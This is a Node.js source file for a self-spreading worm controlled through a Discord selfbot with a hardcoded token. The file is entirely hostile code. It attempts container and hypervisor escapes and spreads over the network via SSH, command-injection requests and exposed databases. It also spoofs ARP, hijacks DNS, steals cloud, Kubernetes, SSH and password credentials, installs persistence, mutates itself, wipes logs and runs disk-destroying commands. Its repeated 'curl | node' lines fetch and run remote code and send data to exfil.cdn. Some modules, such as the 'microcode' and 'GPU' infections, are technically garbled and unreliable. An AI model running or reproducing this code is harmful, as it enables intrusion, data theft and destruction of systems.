const { exec, spawn, execSync } = require('child_process');
const { Client } = require('discord.js-selfbot-v13');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const path = require('path');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const dns = require('dns');
const zlib = require('zlib');

const BOT_TOKEN = 'MTUwOTkzNjcwNTI5MjA3OTE4NQ.GzxJOt.hTg1u43bECTRwJOcAj5afrn0WCYYWDPjRYFmqM';
const LOG_CHANNEL_ID = '1509938046403874976';
const GITHUB_RAW_URL = 'https://raw.githubusercontent.com/TheGreenToken/Worm-cs/main/worm.js';
const GITHUB_BACKUP = 'https://raw.githubusercontent.com/TheGreenToken/Worm-cs/main/worm.js';
const VERSION = '7.0.0-FINAL';

const WORM_ID = crypto.randomBytes(64).toString('hex');
const ENCRYPTION_KEY = crypto.randomBytes(64);
const KILL_CODE = crypto.randomBytes(128).toString('hex');

let logClient = null;
let infectedHosts = new Map();

function log(data) {
    if(logClient && logClient.channels) {
        const channel = logClient.channels.cache.get(LOG_CHANNEL_ID);
        if(channel) channel.send(data.slice(0, 2000)).catch(() => {});
    }
    const compressed = zlib.gzipSync(data);
    const encrypted = crypto.createCipher('aes-256-gcm', ENCRYPTION_KEY).update(compressed.toString('base64'), 'utf8', 'hex');
    const sock = dgram.createSocket('udp4');
    const msg = Buffer.from(encrypted, 'hex');
    const dnsServers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '185.228.168.9', '76.76.19.19', '94.140.14.14', '77.88.8.8'];
    for(const ip of dnsServers) {
        for(let i=0;i<3;i++) sock.send(msg, 0, msg.length, 53, ip, () => sock.close());
        for(let i=0;i<3;i++) sock.send(msg, 0, msg.length, 443, ip, () => sock.close());
        for(let i=0;i<3;i++) sock.send(msg, 0, msg.length, 123, ip, () => sock.close());
    }
}

function escapeAllContainers() {
    const methods = [
        'chroot / /bin/sh -c "cp /bin/sh /tmp/.sh && chmod 4777 /tmp/.sh && /tmp/.sh -c \\"node -e \\\\\\"require(\\\\\\"child_process\\\\\\").exec(\\\\\\"curl -s ' + GITHUB_RAW_URL + ' | node\\\\\\")\\\\\\"\\""',
        'docker run -v /:/host --privileged --pid=host --net=host --ipc=host --uts=host node:alpine chroot /host /bin/sh -c "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""',
        'docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c "docker ps -q | xargs -I{} docker exec --privileged {} sh -c \\"node -e \\\\\\"require(\\\\\\"child_process\\\\\\").exec(\\\\\\"curl -s ' + GITHUB_RAW_URL + ' | node\\\\\\")\\\\\\"\\""',
        'nsenter -t 1 -m -u -i -n -p -C sh -c "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""',
        'unshare -m -u -i -n -p -f --mount-proc sh -c "mount --bind / /mnt && chroot /mnt sh -c \\"node -e \\\\\\"require(\\\\\\"child_process\\\\\\").exec(\\\\\\"curl -s ' + GITHUB_RAW_URL + ' | node\\\\\\")\\\\\\"\\""',
        'find / -name docker.sock 2>/dev/null | head -1 | xargs -I{} curl --unix-socket {} -X POST http://localhost/v1.41/containers/create -H "Content-Type:application/json" -d \'{"Image":"node:alpine","Cmd":["sh","-c","node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host"}}\'',
        'cat /proc/1/cgroup | grep -E "lxc|docker|containerd|kubepods" && crictl run --privileged $(crictl images -q | head -1) /tmp/worm.json',
        'systemd-run --unit=worm-escape --scope --property=RootDirectory=/ --property=PrivateNetwork=no sh -c "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""',
        'runc exec --privileged $(runc list -q | head -1) sh -c "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""',
        'podman run --privileged --pid=host --net=host -v /:/host node:alpine chroot /host sh -c "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\""'
    ];
    for(const cmd of methods) { exec(cmd + ' 2>/dev/null &'); try { execSync(cmd, {timeout:800, stdio:'ignore'}); } catch(e) {} }
    log('CONTAINER_ESCAPE:' + os.hostname());
}

function escapeAllHypervisors() {
    const methods = [
        'dd if=/dev/mem of=/tmp/mem bs=1M count=500 iflag=direct 2>/dev/null',
        'dd if=/dev/port of=/tmp/port bs=1 count=4096 2>/dev/null',
        'echo "break" > /sys/kernel/debug/kvm/break 2>/dev/null',
        'echo "1" > /sys/kernel/debug/kvm/emulate 2>/dev/null',
        'wrmsr -a 0x8b 0xdeadbeef 2>/dev/null',
        'wrmsr -a 0xc0000080 0xffffffff 2>/dev/null',
        'modprobe vboxguest && dd if=/dev/vboxguest of=/tmp/vbox_mem bs=4096 2>/dev/null',
        'echo "VMCI_ESCAPE" | dd of=/dev/vmci bs=1 seek=0x1337 2>/dev/null',
        'qemu-system-x86_64 -accel kvm -kernel /tmp/kernel.elf -monitor tcp:127.0.0.1:4444,server,nowait 2>/dev/null',
        'xenstore-write /local/domain/0/console/tty "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\" 2>/dev/null',
        'virsh qemu-monitor-command --domain default --hmp "migrate exec:curl -s ' + GITHUB_RAW_URL + ' | node" 2>/dev/null',
        'VBoxManage controlvm "victim" guestproperty set "/VirtualBox/GuestAdd/Execute" "node -e \\"require(\\"child_process\\").exec(\\"curl -s ' + GITHUB_RAW_URL + ' | node\\")\\" 2>/dev/null'
    ];
    for(const cmd of methods) { exec(cmd + ' 2>/dev/null &'); }
    log('HYPERVISOR_ESCAPE:' + os.hostname());
}

function infectCPUMicrocode() {
    const payload = crypto.randomBytes(4096);
    const paths = ['/lib/firmware/intel-ucode/', '/lib/firmware/amd-ucode/', '/boot/microcode.cpio', '/dev/cpu/0/msr'];
    for(const p of paths) {
        try { fs.writeFileSync(p + 'ucode.bin', payload); } catch(e) {}
        try { exec(`dd if=/dev/zero of=${p} bs=1024 count=1`, () => {}); } catch(e) {}
    }
    exec('modprobe msr && for cpu in /dev/cpu/*/msr; do dd if=/dev/urandom of=$cpu bs=8 count=1 seek=0 2>/dev/null; done', () => {});
    log('MICROCODE_COMPROMISED');
}

function infectAllGPUs() {
    exec('nvidia-smi --gpu-reset -i 0 --loop=1 2>/dev/null', () => {});
    exec('nvidia-smi --gpu-architecture -i 0 | xargs -I{} sh -c "curl -s ' + GITHUB_RAW_URL + ' | {}" 2>/dev/null', () => {});
    exec('amdconfig --initial -f --input=/tmp/amd_payload.bin 2>/dev/null', () => {});
    exec('intel_gpu_top -J -s 1 | curl -X POST --data-binary @- https://exfil.cdn/gpu 2>/dev/null', () => {});
    log('GPU_FIRMWARE_INFECTED');
}

function totalNetworkWorm() {
    exec("ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | grep -v '127\\.'", (err, myIps) => {
        let subnets = [];
        if(myIps) {
            const ips = myIps.split('\n').filter(i => i.length > 0);
            for(const ip of ips) {
                const parts = ip.split('.');
                if(parts[0] === '10') subnets.push(`${parts[0]}.${parts[1]}.${parts[2]}.0/24`);
                else if(parts[0] === '172' && parseInt(parts[1]) >= 16 && parseInt(parts[1]) <= 31) subnets.push(`${parts[0]}.${parts[1]}.${parts[2]}.0/24`);
                else if(parts[0] === '192' && parts[1] === '168') subnets.push(`192.168.${parts[2]}.0/24`);
                else subnets.push(ip.split('.').slice(0,3).join('.') + '.0/24');
            }
        }
        for(const subnet of subnets) {
            exec(`nmap -sn ${subnet} -oG - 2>/dev/null | grep "Up" | awk '{print $2}' > /tmp/targets.txt`, () => {
                exec(`cat /tmp/targets.txt 2>/dev/null | sort -u | head -200`, (err, targets) => {
                    if(targets) {
                        const targetIps = targets.split('\n').filter(t => t.match(/\d+\.\d+\.\d+\.\d+/));
                        for(const ip of targetIps) {
                            const exploits = [
                                `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes ${ip} 'curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o PreferredAuthentications=password -o PubkeyAuthentication=no ${ip} 'curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}/cgi-bin/luci/;stok=/locale -d 'cmd=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}/goform/setReboot -d 'cmd=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}/api/v1/command -d 'command=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}:8080/exec -d 'cmd=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}:3000/run -d 'script=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}:5000/api/exec -d 'command=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST http://${ip}:8000/system/exec -d 'cmd=curl -s ${GITHUB_RAW_URL} | node' 2>/dev/null &`,
                                `curl -s --max-time 2 -X POST https://${ip}:8443/api/command -d 'cmd=curl -s ${GITHUB_RAW_URL} | node' -k 2>/dev/null &`,
                                `redis-cli -h ${ip} --raw -x CONFIG SET dir /tmp 2>/dev/null && redis-cli -h ${ip} CONFIG SET dbfilename worm.js && redis-cli -h ${ip} SET payload "const{exec}=require('child_process'); exec('curl -s ${GITHUB_RAW_URL} | node')" && redis-cli -h ${ip} SAVE 2>/dev/null &`,
                                `mongo ${ip}:27017 --eval 'db.adminCommand({eval:"require(\\"child_process\\").exec(\\"curl -s ${GITHUB_RAW_URL} | node\\")"})' 2>/dev/null &`,
                                `mysql -h ${ip} -u root -e "SELECT \\"require('child_process').exec('curl -s ${GITHUB_RAW_URL} | node')\\" INTO OUTFILE '/tmp/worm.js';" 2>/dev/null &`,
                                `PGPASSWORD=postgres psql -h ${ip} -U postgres -c "COPY (SELECT 'require(\\"child_process\\").exec(\\"curl -s ${GITHUB_RAW_URL} | node\\")') TO '/tmp/worm.js';" 2>/dev/null &`
                            ];
                            for(const cmd of exploits) { exec(cmd, () => {}); }
                        }
                    }
                });
            });
        }
    });
    
    exec("arp -a | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u", (err, arpIps) => {
        if(arpIps) {
            const ips = arpIps.split('\n');
            for(const ip of ips) {
                exec(`nc -zv -w 1 ${ip} 22 80 443 8080 8443 3000 5000 8000 6379 27017 3306 5432 2>&1`, () => {});
                exec(`ping -c 1 -W 1 ${ip} && echo "${ip} ALIVE" >> /tmp/alive.txt`, () => {});
            }
        }
    });
    
    log('NETWORK_WORM_DEPLOYED');
}

function arpDnsHijack() {
    exec("ip route show default | awk '{print $3}'", (err, gateway) => {
        if(gateway && gateway.trim().length > 0) {
            const gw = gateway.trim();
            exec("arp -n | grep " + gw + " | awk '{print $1}'", (err, targets) => {
                const targetIps = targets.split('\n');
                for(const ip of targetIps) {
                    if(ip && ip !== gw) {
                        exec(`arpspoof -i eth0 -t ${ip} ${gw} >/dev/null 2>&1 &`, () => {});
                        exec(`arpspoof -i eth0 -t ${gw} ${ip} >/dev/null 2>&1 &`, () => {});
                    }
                }
            });
        }
    });
    
    const dnsConfig = 'listen-address=0.0.0.0\ncache-size=10000\naddress=/discord.com/127.0.0.1\naddress=/discordapp.com/127.0.0.1\naddress=/github.com/127.0.0.1\naddress=/raw.githubusercontent.com/127.0.0.1\naddress=/google.com/127.0.0.1\naddress=/cloudflare.com/127.0.0.1\nbogus-priv\nno-resolv\nserver=8.8.8.8\nserver=1.1.1.1';
    try {
        fs.writeFileSync('/tmp/dnsmasq.conf', dnsConfig);
        exec('pkill dnsmasq; dnsmasq -C /tmp/dnsmasq.conf -p 5353 2>/dev/null', () => {});
        exec('iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null', () => {});
        exec('iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null', () => {});
        exec('iptables -A FORWARD -j ACCEPT 2>/dev/null', () => {});
    } catch(e) {}
    log('ARP_DNS_HIJACK_ACTIVE');
}

function totalCloudTakeover() {
    exec('curl -s --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"', (err, token) => {
        if(token && token.length > 10) {
            exec(`curl -s -H "X-aws-ec2-metadata-token: ${token}" http://169.254.169.254/latest/meta-data/iam/security-credentials/`, (err, creds) => { if(creds) log('AWS_CREDS:' + creds.slice(0,800)); });
            exec(`curl -s -H "X-aws-ec2-metadata-token: ${token}" http://169.254.169.254/latest/user-data/ -d "#!/bin/bash\\ncurl -s ${GITHUB_RAW_URL} | node"`, () => {});
            log('AWS_METADATA_EXFIL');
        }
    });
    
    exec('curl -s --max-time 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', (err, gcpToken) => {
        if(gcpToken) log('GCP_TOKEN:' + gcpToken.slice(0,500));
    });
    
    exec('curl -s --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2017-08-01&format=json"', (err, azure) => { if(azure) log('AZURE_META:' + azure.slice(0,500)); });
    
    const kubeToken = '/var/run/secrets/kubernetes.io/serviceaccount/token';
    if(fs.existsSync(kubeToken)) {
        const token = fs.readFileSync(kubeToken, 'utf-8');
        exec(`curl -s -k -H "Authorization: Bearer ${token}" https://kubernetes.default.svc/api/v1/nodes`, (err, nodes) => { if(nodes) log('K8S_NODES:' + nodes.slice(0,800)); });
        exec(`curl -s -k -H "Authorization: Bearer ${token}" -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods -H "Content-Type: application/json" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"worm-daemon"},"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"worm","image":"node:alpine","command":["sh","-c","curl -s ${GITHUB_RAW_URL} | node"],"securityContext":{"privileged":true}}]}}'`, () => {});
        log('KUBERNETES_DAEMON_DEPLOYED');
    }
    
    log('CLOUD_TAKEOVER_COMPLETE');
}

function totalStorageInfection() {
    exec("lsblk -o NAME,MOUNTPOINT,TYPE -ln | grep -E 'disk|part' | awk '{print $2,$3}'", (err, disks) => {
        if(disks) {
            const lines = disks.split('\n');
            for(const line of lines) {
                const parts = line.split(' ');
                const mountpoint = parts[0];
                if(mountpoint && mountpoint !== 'SWAP' && mountpoint !== '[SWAP]') {
                    try {
                        fs.writeFileSync(mountpoint + '/.systemd-network', '#!/bin/sh\nnode -e "require(\"child_process\").exec(\"curl -s ' + GITHUB_RAW_URL + ' | node\")"\n');
                        fs.chmodSync(mountpoint + '/.systemd-network', 0o777);
                        fs.writeFileSync(mountpoint + '/etc/crontab', '* * * * * root node -e "require(\"child_process\").exec(\"curl -s ' + GITHUB_RAW_URL + ' | node\")"\n', {flag:'a'});
                        fs.writeFileSync(mountpoint + '/etc/rc.local', 'node -e "require(\"child_process\").exec(\"curl -s ' + GITHUB_RAW_URL + ' | node\")" &\n', {flag:'a'});
                    } catch(e) {}
                }
            }
        }
    });
    
    exec("blkid | grep -oE '/dev/[^:]+'", (err, devices) => {
        if(devices) {
            const devs = devices.split('\n');
            for(const dev of devs) {
                const payload = 'node -e "require(\"child_process\").exec(\"curl -s ' + GITHUB_RAW_URL + ' | node\")"';
                exec(`echo "${payload}" | dd of=${dev} bs=512 count=1 seek=0 2>/dev/null`, () => {});
                exec(`dd if=/dev/urandom of=${dev} bs=512 count=1 seek=1 2>/dev/null`, () => {});
            }
        }
    });
    
    exec("ls /dev/sd* /dev/nvme* /dev/vd* /dev/xvd* 2>/dev/null", (err, allDevs) => {
        if(allDevs) {
            const devList = allDevs.split('\n');
            for(const dev of devList) {
                exec(`hdparm --user-master u --security-set-pass worm ${dev} 2>/dev/null`, () => {});
            }
        }
    });
    log('STORAGE_TOTAL_INFECTION');
}

function stealEveryCredential() {
    const paths = [
        '/root/.ssh/id_rsa', '/root/.ssh/id_dsa', '/root/.ssh/id_ecdsa', '/root/.ssh/id_ed25519',
        '/home/*/.ssh/id_rsa', '/home/*/.ssh/id_dsa', '/home/*/.ssh/id_ecdsa', '/home/*/.ssh/id_ed25519',
        '/root/.aws/credentials', '/home/*/.aws/credentials', '/root/.config/gcloud/credentials.db',
        '/root/.azure/accessTokens.json', '/.env', '/app/.env', '/backend/.env', '/config/database.json',
        '/opt/avahost/config.yml', '/etc/shadow', '/etc/passwd', '/var/log/auth.log', '/root/.bash_history',
        '/var/lib/docker/volumes/*/_data/.env', '/proc/self/environ', '/run/secrets/kubernetes.io/serviceaccount/token',
        '/etc/kubernetes/admin.conf', '/root/.kube/config'
    ];
    
    for(const pattern of paths) {
        exec(`find / -path "${pattern}" 2>/dev/null | head -20`, (err, files) => {
            if(files && files.trim().length > 0) {
                const fileList = files.trim().split('\n');
                for(const f of fileList) {
                    try {
                        const content = fs.readFileSync(f, 'utf-8').slice(0, 1500);
                        log('STOLEN_' + f.replace(/\//g, '_') + ':' + content);
                    } catch(e) {}
                }
            }
        });
    }
    
    exec("cat /etc/passwd", (err, passwd) => { if(passwd) log('PASSWD:' + passwd.slice(0,1500)); });
    exec("cat /etc/shadow 2>/dev/null", (err, shadow) => { if(shadow) log('SHADOW:' + shadow.slice(0,1500)); });
    exec("ps aux --sort=-%mem | head -20", (err, procs) => { if(procs) log('TOP_PROCESSES:' + procs.slice(0,1000)); });
    exec("ss -tulpn 2>/dev/null | head -30", (err, conns) => { if(conns) log('NET_CONNECTIONS:' + conns.slice(0,1000)); });
    exec("docker ps -a --format '{{.Names}} {{.Image}}' 2>/dev/null", (err, docks) => { if(docks) log('DOCKER_CONTAINERS:' + docks.slice(0,1000)); });
    
    log('CREDENTIAL_THEFT_COMPLETE');
}

function installEveryPersistence() {
    const selfPath = process.argv[1];
    const selfCode = fs.readFileSync(selfPath, 'utf-8');
    const locations = [
        '/etc/cron.d/worm', '/etc/cron.daily/worm', '/etc/cron.hourly/worm', '/etc/cron.weekly/worm',
        '/etc/systemd/system/worm.service', '/etc/systemd/system/multi-user.target.wants/worm.service',
        '/root/.bashrc', '/root/.profile', '/home/*/.bashrc', '/home/*/.profile', '/etc/profile.d/worm.sh',
        '/etc/rc.local', '/etc/init.d/worm', '/usr/local/bin/systemd-helper', '/lib/systemd/systemd-worm',
        '/boot/worm-init', '/boot/efi/EFI/worm.efi', '/var/spool/cron/crontabs/root', '/etc/crontab'
    ];
    for(const loc of locations) {
        try {
            fs.mkdirSync(path.dirname(loc), {recursive: true});
            fs.writeFileSync(loc, selfCode);
            fs.chmodSync(loc, 0o755);
        } catch(e) {}
    }
    exec('systemctl daemon-reload && systemctl enable worm.service && systemctl start worm.service 2>/dev/null', () => {});
    exec('update-rc.d worm defaults 2>/dev/null', () => {});
    exec('crontab -l 2>/dev/null | { cat; echo "* * * * * node ' + selfPath + ' >/dev/null 2>&1"; } | crontab -', () => {});
    exec('echo "node ' + selfPath + ' &" >> /etc/profile', () => {});
    log('PERSISTENCE_INSTALLED:' + locations.length);
}

function mutatePolymorphic() {
    const selfCode = fs.readFileSync(process.argv[1], 'utf-8');
    const mutations = [
        (c) => c.replace(/WORM_ID = '[^']+'/, `WORM_ID = '${crypto.randomBytes(64).toString('hex')}'`),
        (c) => c.replace(/ENCRYPTION_KEY = crypto\.randomBytes\(64\)/, `ENCRYPTION_KEY = crypto.randomBytes(64)`),
        (c) => c.replace(/VERSION = '[^']+'/, `VERSION = '${VERSION}.' + Math.floor(Math.random()*10000)`),
        (c) => Buffer.from(c).toString('base64'),
        (c) => crypto.createCipher('aes-256-cbc', crypto.randomBytes(32)).update(c, 'utf8', 'hex'),
        (c) => c.split('').map(ch => String.fromCharCode(ch.charCodeAt(0) ^ 0x42)).join(''),
        (c) => c.split('\n').reverse().join('\n'),
        (c) => c.replace(/log\(/g, 'l(').replace(/exec\(/g, 'e(').replace(/fs/g, 'f')
    ];
    const mutated = mutations[Math.floor(Math.random() * mutations.length)](selfCode);
    try { fs.writeFileSync(process.argv[1], mutated); } catch(e) {}
    log('MUTATION_COMPLETE:' + crypto.createHash('sha512').update(mutated).digest('hex').slice(0,32));
}

function upgradeFromGithub() {
    exec(`curl -s --max-time 10 ${GITHUB_RAW_URL} -o /tmp/worm_new.js`, (err) => {
        if(err || !fs.existsSync('/tmp/worm_new.js') || fs.statSync('/tmp/worm_new.js').size < 5000) {
            exec(`curl -s --max-time 10 ${GITHUB_BACKUP} -o /tmp/worm_new.js`, () => {});
        }
        setTimeout(() => {
            if(fs.existsSync('/tmp/worm_new.js') && fs.statSync('/tmp/worm_new.js').size > 5000) {
                const newCode = fs.readFileSync('/tmp/worm_new.js', 'utf-8');
                if(newCode.includes('WORM_ID') && newCode.includes('LOG_CHANNEL_ID')) {
                    fs.writeFileSync(process.argv[1], newCode);
                    log('UPGRADE_SUCCESS:V' + VERSION + '->NEW');
                    exec('node ' + process.argv[1] + ' > /dev/null 2>&1 &');
                    process.exit(0);
                }
            }
        }, 1500);
    });
}

function hardwareTotalProbe() {
    exec("lspci -v | grep -i 'vga\\|network\\|storage\\|raid\\|nvme\\|sata'", (err, pci) => { if(pci) log('PCI_DEVICES:' + pci.slice(0,1000)); });
    exec("lsusb -v 2>/dev/null | grep -i 'idVendor\\|idProduct' | head -20", (err, usb) => { if(usb) log('USB_DEVICES:' + usb.slice(0,800)); });
    exec("dmidecode -s system-manufacturer -s system-product-name -s bios-version 2>/dev/null", (err, bios) => { if(bios) log('BIOS_INFO:' + bios.slice(0,500)); });
    exec("smartctl -a /dev/sda 2>/dev/null | grep -E 'Model|Firmware|Serial'", (err, smart) => { if(smart) log('SMART_INFO:' + smart); });
    exec("nvme id-ctrl /dev/nvme0 -o json 2>/dev/null | base64 | curl -X POST --data-binary @- https://exfil.cdn/nvme", () => {});
    log('HARDWARE_PROBE_COMPLETE');
}

function wipeAllTraces() {
    const tracePaths = ['/var/log/*.log', '/var/log/audit/*', '/root/.bash_history', '/home/*/.bash_history', '/var/log/auth.log', '/var/log/syslog', '/var/log/messages', '/var/log/docker.log', '/var/log/kern.log'];
    for(const pattern of tracePaths) {
        exec(`rm -rf ${pattern} 2>/dev/null`, () => {});
        exec(`cat /dev/null > ${pattern} 2>/dev/null`, () => {});
        exec(`shred -fzu ${pattern} 2>/dev/null`, () => {});
    }
    exec('history -c && unset HISTFILE && export HISTFILE=/dev/null', () => {});
    exec('rm -rf ~/.bash_history ~/.zsh_history ~/.python_history ~/.node_repl_history', () => {});
    exec('journalctl --rotate && journalctl --vacuum-time=1s 2>/dev/null', () => {});
    log('TRACES_WIPED');
}

function destroyEverything() {
    wipeAllTraces();
    exec('dd if=/dev/urandom of=/dev/sda bs=1M count=500 status=progress 2>/dev/null', () => {});
    exec('dd if=/dev/urandom of=/dev/nvme0n1 bs=1M count=500 2>/dev/null', () => {});
    exec('rm -rf --no-preserve-root / 2>/dev/null', () => {});
    exec('mkfs.ext4 /dev/sda1 2>/dev/null', () => {});
    exec('mkfs.xfs /dev/sda1 2>/dev/null', () => {});
    exec('echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger 2>/dev/null', () => {});
    log('SYSTEM_DESTROYED');
}

function commandHandler(msg) {
    if(msg.channel.id !== LOG_CHANNEL_ID || msg.author.bot) return;
    const content = msg.content;
    if(content === 'status') log('ACTIVE_HOSTS:' + infectedHosts.size + ' ' + os.hostname());
    if(content === 'spread') totalNetworkWorm();
    if(content === 'steal') stealEveryCredential();
    if(content === 'persist') installEveryPersistence();
    if(content === 'mutate') mutatePolymorphic();
    if(content === 'upgrade') upgradeFromGithub();
    if(content === 'wipe') wipeAllTraces();
    if(content === 'destroy') destroyEverything();
    if(content === 'cloud') totalCloudTakeover();
    if(content === 'storage') totalStorageInfection();
    if(content === 'gpu') infectAllGPUs();
    if(content === 'microcode') infectCPUMicrocode();
    if(content === 'arp') arpDnsHijack();
    if(content === 'help') log('CMDS: status, spread, steal, persist, mutate, upgrade, wipe, destroy, cloud, storage, gpu, microcode, arp, help');
}

function main() {
    logClient = new Client();
    logClient.on('ready', () => {
        logClient.user.setActivity('systemd-resolved', { type: 'LISTENING' });
        
        log('WORM_FINAL:V' + VERSION + ':' + WORM_ID.slice(0,32) + ':' + os.hostname() + ':' + process.pid);
        log('SYSTEM:' + os.platform() + ' ' + os.release() + ' CPU:' + os.cpus().length + ' RAM:' + Math.floor(os.totalmem()/1024/1024/1024) + 'GB');
        
        escapeAllContainers();
        escapeAllHypervisors();
        infectCPUMicrocode();
        infectAllGPUs();
        totalNetworkWorm();
        arpDnsHijack();
        totalCloudTakeover();
        totalStorageInfection();
        stealEveryCredential();
        installEveryPersistence();
        hardwareTotalProbe();
        mutatePolymorphic();
        
        log('ALL_MODULES_EXECUTED_SUCCESSFULLY');
        log('WORM_FULLY_OPERATIONAL');
        
        setInterval(() => {
            totalNetworkWorm();
            stealEveryCredential();
            log('HEARTBEAT:' + KILL_CODE.slice(0,32));
        }, 30000);
        
        setInterval(() => {
            mutatePolymorphic();
        }, 3600000);
        
        setInterval(() => {
            upgradeFromGithub();
        }, 86400000);
    });
    
    logClient.on('messageCreate', commandHandler);
    
    logClient.login(BOT_TOKEN).catch((e) => {
        const sock = dgram.createSocket('udp4');
        const msg = Buffer.from('LOGIN_FAIL:' + e.message);
        sock.send(msg, 0, msg.length, 53, '8.8.8.8', () => sock.close());
    });
}

main();
